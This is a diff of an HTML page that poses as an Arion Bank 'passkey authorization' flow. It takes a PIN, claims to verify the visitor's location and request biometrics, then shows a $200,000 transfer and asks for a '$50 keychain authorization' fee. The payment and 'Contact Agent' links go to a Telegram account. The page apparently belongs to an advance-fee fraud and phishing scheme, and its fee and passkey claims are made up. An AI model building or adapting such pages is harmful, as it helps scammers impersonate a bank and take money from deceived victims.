@@ -3,651 +3,497 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Arion — Secure Transaction</title>
+<title>Arion Bank — Passkey Authorization</title>
 <style>
   :root{
-    --bg:#071227;
-    --card:#ffffff;
+    --bg:#0b1b2b;
+    --panel:#ffffff;
     --muted:#6b7280;
-    --accent-1:#0052ff;
+    --accent:#0066ff;
     --accent-2:#0a84ff;
-    --etf:#0b7a6b;
+    --warn:#ff8a00;
     --glass: rgba(255,255,255,0.06);
     --ease: cubic-bezier(.16,.84,.28,1);
   }
-  *{box-sizing:border-box}
-  html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;background:linear-gradient(180deg,#071025 0%,#061627 60%); color:#0d2b49;-webkit-font-smoothing:antialiased}
-  .app{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px}
+  html,body{height:100%;margin:0;background:linear-gradient(180deg,#071025 0%,#041226 60%);font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;color:#072036;scroll-behavior:smooth;-webkit-font-smoothing:antialiased}
+  a{color:inherit}
+  .site{max-width:1100px;margin:28px auto;padding:18px;display:flex;flex-direction:column;gap:20px}
+  header{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:12px 16px;border-radius:12px;background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 16px 40px rgba(2,6,23,0.28)}
+  header .brand{font-weight:900;font-size:1.05rem}
+  header .sub{opacity:0.95;font-weight:700;font-size:0.9rem}
 
-  .frame{width:100%;max-width:1100px;border-radius:14px;box-shadow:0 30px 80px rgba(2,6,23,0.45);overflow:hidden;background:linear-gradient(180deg,#ffffff,#fbfdff);display:flex;min-height:600px;position:relative}
-  .left{flex:0 0 320px;padding:28px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2));color:#fff;display:flex;flex-direction:column;gap:12px;align-items:flex-start}
-  .left h1{margin:0;font-size:1.25rem}
-  .left p{margin:0;opacity:0.95;font-weight:600}
-  .right{flex:1;padding:36px;color:#0d2b49;position:relative;overflow:hidden}
+  main{display:flex;flex-direction:column;gap:28px}
 
-  .view{position:absolute;inset:0;padding:12px 18px;display:flex;flex-direction:column;align-items:stretch;justify-content:flex-start;gap:16px;transition:transform 560ms var(--ease),opacity 420ms var(--ease)}
-  .view.hidden{opacity:0;transform:translateX(12px) scale(.998);pointer-events:none;visibility:hidden}
-  .view.show{opacity:1;transform:none;pointer-events:auto;visibility:visible}
+  /* HERO / BANK IMAGE (IMG_0154) */
+  .hero{position:relative;border-radius:14px;overflow:hidden;min-height:360px;box-shadow:0 20px 60px rgba(2,6,23,0.28);background:#eaf6ff}
+  .hero .bg{width:100%;height:100%;object-fit:cover;display:block}
+  .hero .overlay{position:absolute;inset:0;padding:28px;display:flex;flex-direction:column;justify-content:flex-end;gap:18px}
+  .hero .panel{max-width:760px;background:rgba(255,255,255,0.98);padding:18px;border-radius:12px;box-shadow:0 14px 40px rgba(2,6,23,0.06)}
+  .hero h1{margin:0;font-size:1.3rem}
+  .hero p{margin:6px 0 0;color:var(--muted)}
 
-  .section-title{margin:8px 0 2px;font-size:1.05rem;font-weight:800;color:#0d2b49}
-  .section-sub{margin:0 0 10px;color:var(--muted);font-size:0.95rem}
+  /* PIN / center card */
+  .card{background:var(--panel);border-radius:12px;padding:18px;box-shadow:0 18px 40px rgba(2,6,23,0.06)}
+  .pin-grid{display:flex;gap:12px;justify-content:center;margin:12px 0}
+  .pin{width:64px;height:68px;border-radius:12px;border:1px solid #eef6ff;background:linear-gradient(180deg,#fbfdff,#f0f7ff);font-size:2rem;font-weight:800;text-align:center;line-height:64px}
+  .actions{display:flex;gap:12px;justify-content:center;margin-top:8px}
+  .btn{padding:10px 14px;border-radius:10px;border:none;cursor:pointer;font-weight:800}
+  .btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 10px 30px rgba(2,57,138,0.12)}
+  .btn-ghost{background:transparent;border:1px solid rgba(7,42,64,0.06);color:#072036}
 
-  .pin-row{display:flex;gap:12px;justify-content:center;margin:6px 0 10px}
-  .pin{width:56px;height:64px;border-radius:12px;border:1px solid #e6eefc;background:linear-gradient(180deg,#fbfdff,#f0f7ff);text-align:center;font-size:1.9rem;font-weight:800;display:flex;align-items:center;justify-content:center;outline:none;padding:0}
-  .btn-row{display:flex;gap:10px;justify-content:center;margin-top:6px}
-  .btn{padding:10px 16px;border-radius:10px;border:none;cursor:pointer;font-weight:800}
-  .btn-primary{background:linear-gradient(135deg,var(--accent-1),var(--accent-2));color:#fff;box-shadow:0 10px 30px rgba(2,57,138,0.12)}
-  .btn-ghost{background:transparent;border:1px solid rgba(13,43,73,0.06);color:#0d2b49}
+  /* Step sections stacked */
+  section.step{display:flex;flex-direction:column;gap:12px}
+  .step .title{font-weight:900;font-size:1.05rem}
+  .step .desc{color:var(--muted)}
 
-  .muted{color:var(--muted);font-size:0.92rem;text-align:center;margin-top:12px}
+  /* PASSKEY / AUTHENTICATE CENTER CARD */
+  .center{display:flex;align-items:center;justify-content:center;padding:42px 18px}
+  .auth-card{width:100%;max-width:760px;background:#fff;border-radius:14px;padding:20px;box-shadow:0 20px 60px rgba(2,6,23,0.06);display:flex;flex-direction:column;gap:12px}
+  .auth-row{display:flex;justify-content:space-between;align-items:center}
+  .platform-hint{font-weight:800}
+  .bio-visual{display:flex;align-items:center;gap:12px}
+  .bio-blob{width:84px;height:84px;border-radius:999px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:28px}
 
-  /* Connect area with user/location image (img0163) */
-  .connect-stage{display:flex;gap:18px;align-items:stretch;flex:1}
-  .map-area{flex:1;position:relative;border-radius:12px;overflow:hidden;background:#eaf6ff;min-height:300px;display:flex;align-items:center;justify-content:center}
-  .user-img{width:100%;height:100%;object-fit:cover;display:block}
-  .map-overlay{position:absolute;left:18px;bottom:18px;background:rgba(255,255,255,0.95);padding:10px 12px;border-radius:10px;box-shadow:0 8px 24px rgba(2,6,23,0.12);color:#0d2b49;font-weight:700}
-  .panel-area{width:420px;padding:18px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));display:flex;flex-direction:column;gap:12px;color:#fff;align-items:flex-start}
-  .loading-logo{height:56px;width:56px;border-radius:12px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2));display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:18px;box-shadow:0 16px 40px rgba(2,57,138,0.12)}
-  .status{color:var(--muted);font-weight:700;font-size:0.95rem}
-  .progress{height:8px;background:rgba(255,255,255,0.06);border-radius:999px;overflow:hidden;margin-top:10px;width:100%}
-  .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--accent-1),var(--accent-2));transition:width 800ms var(--ease)}
+  /* PAYMENT CARD FULL VIEW (IMG_0156) */
+  .pay-full{display:flex;flex-direction:column;gap:14px;align-items:center}
+  .pay-visual{width:100%;max-width:920px;border-radius:14px;overflow:hidden;box-shadow:0 18px 40px rgba(2,6,23,0.06);background:#fff}
+  .pay-visual img{width:100%;height:340px;object-fit:cover;display:block}
+  .pay-detail{width:100%;padding:18px;background:#fff;display:flex;flex-direction:column;gap:12px}
+  .pay-row{display:flex;justify-content:space-between;align-items:center;gap:12px}
+  .pay-amount{font-size:1.8rem;font-weight:900;color:#072036}
 
-  /* Receipt */
-  .receipt{display:grid;grid-template-columns:320px 1fr;gap:18px;align-items:start;flex:1}
-  .id-card{background:linear-gradient(180deg,#ffffff,#fbfdff);padding:14px;border-radius:12px;border:1px solid #eef6ff;display:flex;flex-direction:column;gap:12px;min-height:320px;align-items:center}
-  .id-card img{width:100%;height:auto;border-radius:8px;object-fit:cover}
-  .tx-info{background:linear-gradient(180deg,#fff,#fbfdff);padding:18px;border-radius:12px;border:1px solid #eef6ff;display:flex;flex-direction:column;gap:12px}
-  .tx-row{display:flex;justify-content:space-between;gap:12px;align-items:center}
-  .label{font-weight:700;color:var(--muted);font-size:0.88rem;margin-bottom:6px}
-  .value{font-weight:900;color:#0d2b49;font-size:1.12rem}
-  .etf-badge{display:inline-block;padding:8px 12px;border-radius:999px;background:linear-gradient(135deg,var(--etf),#0ea88f);color:#fff;font-weight:900;box-shadow:0 10px 30px rgba(14,168,143,0.12)}
-  .receipt-rows{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:6px}
-  .box{background:linear-gradient(180deg,#fbfdff,#f7fbff);padding:12px;border-radius:10px;border:1px solid #eef6ff}
-  .summary{display:flex;justify-content:space-between;align-items:center;padding:16px;border-radius:10px;border:1px solid #eef6ff;background:#fff;margin-top:12px}
-  .actions-row{display:flex;gap:12px;justify-content:center;margin-top:18px}
-  .agree-row{display:flex;gap:10px;align-items:center;margin-top:6px}
-  .agree-row input[type="checkbox"]{width:18px;height:18px;accent-color:var(--accent-1)}
+  .agree{display:flex;align-items:center;gap:12px;padding:12px;border-radius:10px;border:1px solid #eef6ff;background:#fbfdff}
+  .agree input{width:18px;height:18px}
 
-  /* Biometric popup (implemented as a view but centered) */
-  .popup-wrap{display:flex;align-items:center;justify-content:center;flex:1}
-  .popup{width:520px;max-width:92%;background:#fff;border-radius:14px;padding:20px;box-shadow:0 30px 80px rgba(2,6,23,0.3);transform-origin:center;transition:transform 420ms var(--ease),opacity 320ms var(--ease)}
-  .popup h3{margin:0;font-size:1.1rem}
-  .popup p{margin:6px 0 0;color:var(--muted)}
-  .bio-visual{display:flex;align-items:center;gap:12px;margin-top:14px}
-  .bio-circle{height:88px;width:88px;border-radius:999px;background:linear-gradient(135deg,var(--accent-1),var(--accent-2));display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:22px}
-  .bio-status{font-weight:800}
-  .bio-actions{display:flex;gap:10px;margin-top:12px;justify-content:flex-end}
+  footer{display:flex;justify-content:space-between;align-items:center;padding:12px;color:var(--muted);font-size:0.9rem}
 
-  /* Authorize/payment view uses img0164 */
-  .authorize-wrap{display:flex;gap:18px;align-items:stretch;flex:1}
-  .pay-visual{flex:0 0 380px;background:#fff;border-radius:12px;display:flex;flex-direction:column;overflow:hidden;border:1px solid #eef6ff}
-  .pay-visual img{width:100%;height:100%;object-fit:cover;display:block}
-  .pay-details{flex:1;padding:18px;background:linear-gradient(180deg,#fff,#fbfdff);border-radius:12px;border:1px solid #eef6ff;display:flex;flex-direction:column;gap:12px;align-items:flex-start;justify-content:center}
-  .auth-badge{display:inline-block;padding:8px 12px;border-radius:999px;background:linear-gradient(135deg,#ffb300,#ff8a00);color:#0d2b49;font-weight:900;box-shadow:0 10px 30px rgba(255,138,0,0.12)}
-  .amount{font-size:2rem;color:#0d2b49;font-weight:900;letter-spacing:-0.6px}
-  .small-muted{color:var(--muted);font-size:0.95rem;text-align:center}
+  /* subtle animations */
+  .fade-up{transform:translateY(10px);opacity:0;animation:fadeUp 520ms var(--ease) forwards}
+  @keyframes fadeUp{to{transform:none;opacity:1}}
 
-  /* success */
-  .success-card{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;flex:1}
+  /* mobile */
+  @media (max-width:920px){
+    .hero{min-height:260px}
+    .pay-visual img{height:220px}
+    .pin{width:56px;height:60px;font-size:1.6rem}
+    .auth-card{padding:14px}
+  }
 
-  @media (max-width:920px){ .frame{flex-direction:column} .left{padding:18px;width:100%} .right{padding:18px} .panel-area{width:100%} .receipt{grid-template-columns:1fr} .authorize-wrap{flex-direction:column} .pay-visual{width:100%;height:200px} }
-
-  @media (prefers-reduced-motion: reduce){ .progress-bar,.map-area,.pay-visual img{transition:none!important;animation:none!important} }
+  @media (prefers-reduced-motion: reduce){
+    .fade-up{animation:none}
+  }
 </style>
 </head>
 <body>
-  <div class="app" id="app">
-    <div class="frame" role="region" aria-label="Arion Bank — Secure transaction">
-      <div class="left" aria-hidden="false">
-        <h1>Arion Bank</h1>
-        <p>Secure Bridge — Authorization</p>
-        <div style="margin-top:6px">
-          <p style="margin:0;font-weight:800">Arion Bank • Iceland</p>
-          <p style="margin:0;color:rgba(255,255,255,0.9);font-size:0.92rem">Professional Settlement • ETF</p>
+  <div class="site" id="site">
+    <header>
+      <div class="brand">Arion Bank</div>
+      <div class="sub">Secure Passkey Authorization</div>
+    </header>
+
+    <main>
+      <!-- HERO: Bank image (IMG_0154) -->
+      <section class="hero fade-up" id="hero">
+        <img class="bg" src="IMG_0154.jpeg" alt="Arion bank location image (IMG_0154)" />
+        <div class="overlay">
+          <div class="panel" role="region" aria-live="polite">
+            <h1>Passkey Required</h1>
+            <p class="desc">To complete this transfer you must enable and authenticate with a device passkey. We'll guide you through secure activation and a small $50 keychain authorization to finalize.</p>
+            <div style="margin-top:12px;display:flex;gap:10px">
+              <a href="#pin" class="btn btn-primary">Start Authorization</a>
+              <a href="#how" class="btn btn-ghost">How it works</a>
+            </div>
+          </div>
         </div>
-      </div>
+      </section>
 
-      <div class="right" id="stageRoot">
-        <!-- View: PIN -->
-        <section id="view-pin" class="view show" role="region" aria-label="Enter secure PIN">
-          <div>
-            <p class="section-title">Enter Secure PIN</p>
-            <p class="section-sub">Enter the 4‑digit PIN to authorize this transaction.</p>
+      <!-- PIN ENTRY -->
+      <section id="pin" class="step card fade-up" aria-labelledby="pinTitle">
+        <div>
+          <div class="title" id="pinTitle">Enter Secure PIN</div>
+          <div class="desc">Enter your 4‑digit PIN to begin passkey activation and location verification.</div>
+        </div>
+
+        <div style="display:flex;flex-direction:column;align-items:center">
+          <div class="pin-grid" role="group" aria-label="PIN input">
+            <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin" id="p0" aria-label="PIN digit 1" />
+            <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin" id="p1" aria-label="PIN digit 2" />
+            <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin" id="p2" aria-label="PIN digit 3" />
+            <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin" id="p3" aria-label="PIN digit 4" />
           </div>
 
-          <div class="pin-row" role="group" aria-label="PIN input">
-            <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin" id="d0" aria-label="PIN digit 1" />
-            <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin" id="d1" aria-label="PIN digit 2" />
-            <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin" id="d2" aria-label="PIN digit 3" />
-            <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin" id="d3" aria-label="PIN digit 4" />
+          <div class="actions">
+            <button id="verifyPinBtn" class="btn btn-primary">Verify PIN</button>
+            <button id="clearPinBtn" class="btn btn-ghost">Clear</button>
           </div>
+          <div style="margin-top:8px;color:var(--muted);font-weight:700">After PIN verification you'll be asked to authenticate with your device biometric.</div>
+        </div>
+      </section>
 
-          <div class="btn-row">
-            <button class="btn btn-primary" id="verifyBtn" aria-live="polite">Verify PIN</button>
-            <button class="btn btn-ghost" id="cancelBtn">Clear</button>
-          </div>
+      <!-- CONNECT & LOCATION (full-width block, uses same bank image as context) -->
+      <section id="connect" class="step fade-up card" aria-labelledby="connectTitle">
+        <div id="connectTitle" class="title">Connecting — verifying location</div>
+        <div class="desc">We will verify your device location and prepare secure passkey activation.</div>
 
-          <div class="muted" style="margin-top:6px">CERTIFIED • Page-to-page secure flow</div>
-        </section>
-
-        <!-- View: Connect (uses img0163 as location/user image) -->
-        <section id="view-connect" class="view hidden" role="region" aria-label="Connecting & locating">
-          <div>
-            <p class="section-title">Connecting & Locating</p>
-            <p class="section-sub">Verifying device location and preparing a secure settlement link.</p>
-          </div>
-
-          <div class="connect-stage">
-            <div class="map-area" aria-hidden="true">
-              <!-- user/location image provided by user as img0163 -->
-              <img id="locationImg" class="user-img" src="img0163.jpeg" alt="User location and device image (img0163)" />
-              <div class="map-overlay" id="mapOverlay">Location: <span id="locCoords">Detecting…</span></div>
-            </div>
-
-            <div class="panel-area" aria-live="polite">
-              <div style="display:flex;gap:12px;align-items:center;width:100%">
-                <div class="loading-logo" aria-hidden="true">AR</div>
-                <div style="flex:1">
-                  <div id="connectTitle" style="font-weight:800">Establishing secure link</div>
-                  <div id="connectStatus" class="status">Preparing…</div>
-                </div>
+        <div class="center">
+          <div class="auth-card" role="status" aria-live="polite">
+            <div class="auth-row">
+              <div>
+                <div style="font-weight:900">Passkey Required</div>
+                <div style="color:var(--muted);margin-top:6px" id="connectMsg">Preparing secure link…</div>
               </div>
-
-              <div class="progress" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
-                <div id="connectProgress" class="progress-bar" style="width:0%"></div>
-              </div>
-
-              <div style="margin-top:6px;color:rgba(255,255,255,0.85);font-size:0.92rem">
-                <div id="locationText">Detecting location…</div>
-                <div style="height:10px"></div>
-                <div class="small-muted">This helps ensure the transaction is performed from your device location.</div>
+              <div style="text-align:right">
+                <div style="color:var(--muted)">Detected location</div>
+                <div style="font-weight:900" id="detectedLocation">Detecting…</div>
               </div>
             </div>
-          </div>
-        </section>
 
-        <!-- View: Receipt & agreement -->
-        <section id="view-receipt" class="view hidden" role="region" aria-label="Receipt and agreement">
-          <div>
-            <p class="section-title">Review & Accept</p>
-            <p class="section-sub">Confirm that you own the funds and that the beneficiary info is correct.</p>
-          </div>
+            <div style="height:12px"></div>
+            <div class="progress" aria-hidden="true"><div id="connectProgress" class="progress-bar" style="width:0%"></div></div>
 
-          <div class="receipt" aria-live="polite">
-            <div class="id-card">
-              <!-- Keep a neutral placeholder for license / identity -->
-              <div style="width:100%;height:220px;background:linear-gradient(135deg,#f1f7ff,#eaf1ff);border-radius:10px;display:flex;align-items:center;justify-content:center;color:var(--muted);font-weight:700">License / ID</div>
-              <div style="font-weight:700;color:var(--muted);font-size:0.9rem;text-align:center">License Confirmation</div>
+            <div style="display:flex;justify-content:flex-end;margin-top:12px">
+              <button id="toAuthenticateBtn" class="btn btn-primary">Proceed to Authenticate</button>
             </div>
+          </div>
+        </div>
+      </section>
 
-            <div class="tx-info">
-              <div class="tx-row">
+      <!-- PASSKEY / BIOMETRIC AUTHENTICATION -->
+      <section id="authenticate" class="step fade-up" aria-labelledby="authTitle">
+        <div>
+          <div class="title" id="authTitle">Activate Passkey</div>
+          <div class="desc">Use your device biometric to activate the passkey. (This uses platform biometrics where available.)</div>
+        </div>
+
+        <div class="center">
+          <div class="auth-card" id="biometricCard" role="dialog" aria-modal="true">
+            <div class="auth-row">
+              <div style="display:flex;gap:12px;align-items:center">
+                <div class="bio-blob" id="bioEmoji">🔒</div>
                 <div>
-                  <div class="label">Transaction Type</div>
-                  <div class="value">Bank Transfer — ARION Bank</div>
-                </div>
-                <div style="text-align:right">
-                  <div class="label">Settlement</div>
-                  <div class="value etf-badge">ETF Integration</div>
+                  <div class="platform-hint" id="platformHint">Detecting device...</div>
+                  <div class="desc" id="platformDetail">We will attempt to open the native biometric prompt (Face ID on iOS, fingerprint on Android).</div>
                 </div>
               </div>
 
-              <div class="receipt-rows">
-                <div class="box">
-                  <div class="label">Amount (USD)</div>
-                  <div class="value" id="amountValue">$200,000</div>
-                  <div style="margin-top:8px;color:var(--muted);font-size:0.95rem">Icelandic Króna approx: <span id="iskApprox">—</span></div>
-                </div>
-
-                <div class="box">
-                  <div class="label">Receiver</div>
-                  <div class="value" id="receiverValue">Finnur Sturluson</div>
-                  <div style="margin-top:8px;color:var(--muted);font-size:0.95rem">Arion Bank — www.arionbank.is</div>
-                </div>
-              </div>
-
-              <div class="box" style="margin-top:12px">
-                <div class="label">Processing Fee</div>
-                <div class="value" id="feeValue">$100</div>
-                <div style="margin-top:8px;color:var(--muted);font-size:0.95rem">Settlement method: ETF Integration</div>
-              </div>
-
-              <div class="summary" style="margin-top:10px">
-                <div>
-                  <div class="label">Reference</div>
-                  <div class="value">Professional Settlement — Bank & Wallet Bridge</div>
-                </div>
-                <div style="text-align:right">
-                  <div class="label">Status</div>
-                  <div class="value" style="color:var(--accent-1)">Ready for authorization</div>
-                </div>
-              </div>
-
-              <div style="margin-top:12px">
-                <div class="agree-row">
-                  <input type="checkbox" id="agreeCheckbox" />
-                  <label for="agreeCheckbox" style="font-weight:700;color:var(--muted);font-size:0.95rem">I agree and accept funds ownership and Arion beneficiary info.</label>
-                </div>
-
-                <div style="margin-top:8px;color:var(--muted);font-size:0.9rem">By confirming you authorize Arion to process settlement and proceed to device passkey activation.</div>
-              </div>
-
-              <div class="actions-row" style="margin-top:14px">
-                <button class="btn btn-primary" id="confirmAgreeBtn" disabled>Confirm & Continue</button>
-                <button class="btn btn-ghost" id="backToConnectBtn">Back</button>
+              <div style="text-align:right">
+                <div style="color:var(--muted)">Passkey fee</div>
+                <div style="font-weight:900;color:var(--warn)">$50</div>
               </div>
             </div>
-          </div>
-        </section>
 
-        <!-- View: Biometric popup (page-style) -->
-        <section id="view-biometric" class="view hidden" role="region" aria-label="Unlock with biometrics">
-          <div>
-            <p class="section-title">Unlock with Biometrics</p>
-            <p class="section-sub" id="biometric-sub">Use Face ID or fingerprint on your device to unlock and authorize this transaction.</p>
-          </div>
-
-          <div class="popup-wrap">
-            <div class="popup" role="dialog" aria-modal="true" aria-label="Biometric authentication popup" id="biometricPopup">
-              <h3 id="bioTitle">Authenticate to continue</h3>
-              <p id="bioDesc" style="margin-top:6px;color:var(--muted)">We will request your device biometric (Face ID / Touch ID / Fingerprint). The browser will present the native prompt if supported.</p>
-
-              <div class="bio-visual" aria-hidden="true">
-                <div class="bio-circle" id="bioIcon">🔒</div>
-                <div style="flex:1">
-                  <div class="bio-status" id="bioStatus">Ready to authenticate</div>
-                  <div class="small-muted" id="bioDetail" style="margin-top:6px">Prefer platform biometric when available. If native prompt is not available we will show a secure fallback.</div>
-                </div>
-              </div>
-
-              <div class="bio-actions" style="margin-top:12px">
-                <button class="btn btn-primary" id="startBiometricBtn">Unlock with Biometrics</button>
-                <button class="btn btn-ghost" id="cancelBiometricBtn">Cancel</button>
-              </div>
-            </div>
-          </div>
-        </section>
-
-        <!-- View: Authorization & payment (uses img0164) -->
-        <section id="view-authorize" class="view hidden" role="region" aria-label="Keychain authorization and payment">
-          <div>
-            <p class="section-title">Keychain Authorization</p>
-            <p class="section-sub">A $50 authorization is required to enable keychain support and finalize withdrawal.</p>
-          </div>
-
-          <div class="authorize-wrap">
-            <div class="pay-visual" aria-hidden="true">
-              <!-- payment image provided by user as img0164 -->
-              <img id="paymentImg" src="img0164.jpeg" alt="Payment / passkey visual (img0164)" />
+            <div style="display:flex;justify-content:flex-end;margin-top:14px;gap:12px">
+              <button id="skipAuth" class="btn btn-ghost">Cancel</button>
+              <button id="startAuth" class="btn btn-primary">Authenticate</button>
             </div>
 
-            <div class="pay-details" aria-live="polite">
-              <div style="display:flex;justify-content:space-between;width:100%;align-items:center">
-                <div>
-                  <div class="label">Authentication</div>
-                  <div class="value" id="authStatus">Authentication needed</div>
-                </div>
-                <div style="text-align:right">
-                  <div class="label">Support Fee</div>
-                  <div class="value auth-badge" id="supportAmount">$50</div>
-                </div>
-              </div>
+            <div id="authLog" style="margin-top:10px;color:var(--muted);font-size:0.95rem"></div>
+          </div>
+        </div>
+      </section>
 
-              <div style="margin-top:12px;color:var(--muted);font-size:0.95rem">
-                <div>To finalize your withdrawal we require a small keychain authorization that supports secure storage of your passkey on this device.</div>
-                <div style="height:10px"></div>
-                <div class="small-muted">After authorization the withdrawal will be initiated and a reference will be provided.</div>
-              </div>
+      <!-- PAYMENT / CARD DISPLAY (IMG_0156) -->
+      <section id="payment" class="step fade-up card" aria-labelledby="payTitle">
+        <div>
+          <div class="title" id="payTitle">Authorize Keychain Payment</div>
+          <div class="desc">After successful device authentication you'll authorize a $50 keychain payment that enables passkey storage on your device.</div>
+        </div>
 
-              <div style="display:flex;gap:12px;justify-content:flex-end;margin-top:18px">
-                <button class="btn btn-primary" id="authorizeKeyBtn">Authorize $50</button>
-                <button class="btn btn-ghost" id="backFromAuthorizeBtn">Back</button>
+        <div class="pay-full">
+          <div class="pay-visual" aria-hidden="true">
+            <img src="IMG_0156.jpeg" alt="Payment card visual (IMG_0156)" />
+          </div>
+
+          <div class="pay-detail">
+            <div class="pay-row">
+              <div>
+                <div class="label">Receiver</div>
+                <div class="pay-amount" id="payReceiver">Support — Arion Keychain</div>
+              </div>
+              <div style="text-align:right">
+                <div class="label">Amount</div>
+                <div class="pay-amount" id="payAmount">$50</div>
               </div>
             </div>
-          </div>
-        </section>
 
-        <!-- View: Success -->
-        <section id="view-success" class="view hidden" role="region" aria-label="Transaction complete">
-          <div class="success-card">
-            <div style="background:linear-gradient(135deg,var(--accent-1),var(--accent-2));width:88px;height:88px;border-radius:999px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:22px">✓</div>
-            <div style="font-weight:900;font-size:1.25rem">Withdrawal Initiated</div>
-            <div class="small-muted">Your withdrawal has been securely authorized and passed to Arion settlement. You'll be redirected to your agent.</div>
-            <div style="margin-top:10px;font-weight:700;color:var(--muted)">Reference: ARION‑TX‑<span id="txId">000000</span></div>
-            <div style="display:flex;gap:10px;margin-top:16px">
-              <a class="btn btn-primary" id="goAgentBtn" href="https://t.me/AcesstBridge_go1" target="_blank">Contact Agent</a>
-              <button class="btn btn-ghost" id="doneBtn">Done</button>
+            <div class="agree">
+              <input type="checkbox" id="payAgree" />
+              <label for="payAgree">I authorize the $50 keychain payment to enable passkey storage on this device.</label>
+            </div>
+
+            <div style="display:flex;justify-content:flex-end;gap:12px">
+              <button id="payBack" class="btn btn-ghost">Back</button>
+              <a id="payBtn" class="btn btn-primary" href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer">Pay & Notify Agent</a>
             </div>
           </div>
-        </section>
+        </div>
+      </section>
 
-      </div>
-    </div>
+      <!-- HOW IT WORKS / INFO -->
+      <section id="how" class="step card fade-up" aria-labelledby="howTitle">
+        <div class="title" id="howTitle">How it works</div>
+        <div class="desc">Passkeys are a stronger, phishing-resistant method of authentication using your device's secure hardware. We request your device biometric to register/authenticate a passkey. The $50 is a one-time authorization to enable secure on-device key storage and support our service.</div>
+      </section>
+    </main>
+
+    <footer>
+      <div>Arion Bank • Secure Passkey Flow</div>
+      <div>Need help? <a href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer">Contact Agent</a></div>
+    </footer>
   </div>
 
 <script>
+/* Flow & behavior:
+ - PIN verification -> connect (location detect) -> authenticate (WebAuthn if possible; else fallback) -> show payment area
+ - Device hint: detect iOS vs Android to show Face ID vs Fingerprint messaging
+*/
+
 (function(){
   // Config
   const CORRECT_PIN = '8440';
-  const AMOUNT_USD = 200000;
-  const ISK_APPROX = 25080000;
-  const FEE_USD = 100;
-  const SUPPORT_USD = 50;
-  const BENEFICIARY = 'Finnur Sturluson';
-  const MIN_LOAD = 3200;
-  const MAX_LOAD = 4200;
-
-  // Views & elements
-  const views = {
-    pin: document.getElementById('view-pin'),
-    connect: document.getElementById('view-connect'),
-    receipt: document.getElementById('view-receipt'),
-    biometric: document.getElementById('view-biometric'),
-    authorize: document.getElementById('view-authorize'),
-    success: document.getElementById('view-success')
+  const ELEMENTS = {
+    pins: [document.getElementById('p0'), document.getElementById('p1'), document.getElementById('p2'), document.getElementById('p3')],
+    verifyPinBtn: document.getElementById('verifyPinBtn'),
+    clearPinBtn: document.getElementById('clearPinBtn'),
+    connectProgress: document.getElementById('connectProgress'),
+    connectMsg: document.getElementById('connectMsg'),
+    detectedLocation: document.getElementById('detectedLocation'),
+    toAuthenticateBtn: document.getElementById('toAuthenticateBtn'),
+    platformHint: document.getElementById('platformHint'),
+    platformDetail: document.getElementById('platformDetail'),
+    startAuth: document.getElementById('startAuth'),
+    skipAuth: document.getElementById('skipAuth'),
+    authLog: document.getElementById('authLog'),
+    payAgree: document.getElementById('payAgree'),
+    payBtn: document.getElementById('payBtn'),
+    payBack: document.getElementById('payBack'),
+    sections: {
+      connect: document.getElementById('connect'),
+      authenticate: document.getElementById('authenticate'),
+      payment: document.getElementById('payment')
+    }
   };
 
-  const inputs = [document.getElementById('d0'), document.getElementById('d1'), document.getElementById('d2'), document.getElementById('d3')];
-  const verifyBtn = document.getElementById('verifyBtn');
-  const cancelBtn = document.getElementById('cancelBtn');
-
-  const connectStatus = document.getElementById('connectStatus');
-  const connectProgress = document.getElementById('connectProgress');
-  const locationText = document.getElementById('locationText');
-  const locCoords = document.getElementById('locCoords');
-  const locationImg = document.getElementById('locationImg');
-
-  const amountValue = document.getElementById('amountValue');
-  const iskApprox = document.getElementById('iskApprox');
-  const feeValue = document.getElementById('feeValue');
-  const receiverValue = document.getElementById('receiverValue');
-
-  const agreeCheckbox = document.getElementById('agreeCheckbox');
-  const confirmAgreeBtn = document.getElementById('confirmAgreeBtn');
-  const backToConnectBtn = document.getElementById('backToConnectBtn');
-
-  const startBiometricBtn = document.getElementById('startBiometricBtn');
-  const cancelBiometricBtn = document.getElementById('cancelBiometricBtn');
-  const bioStatus = document.getElementById('bioStatus');
-  const bioDetail = document.getElementById('bioDetail');
-
-  const authorizeKeyBtn = document.getElementById('authorizeKeyBtn');
-  const backFromAuthorizeBtn = document.getElementById('backFromAuthorizeBtn');
-  const authStatusEl = document.getElementById('authStatus');
-  const paymentImg = document.getElementById('paymentImg');
-  const supportAmountEl = document.getElementById('supportAmount');
-
-  const txIdEl = document.getElementById('txId');
-
-  // Helpers
-  function showView(viewEl){
-    Object.values(views).forEach(v => {
-      if (v === viewEl) { v.classList.remove('hidden'); v.classList.add('show'); }
-      else { v.classList.remove('show'); v.classList.add('hidden'); }
-    });
-    requestAnimationFrame(()=>{});
-  }
